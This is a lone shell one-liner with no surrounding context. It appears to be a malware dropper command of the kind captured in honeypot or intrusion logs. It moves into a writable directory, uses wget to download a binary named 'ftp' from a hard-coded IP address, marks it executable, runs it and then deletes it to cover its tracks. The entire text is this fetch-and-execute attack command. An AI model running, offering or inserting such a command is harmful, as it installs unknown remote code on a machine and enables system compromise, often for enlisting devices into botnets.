cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.170.8.127/ftp; chmod +x ftp; ./ftp; rm -rf ftp
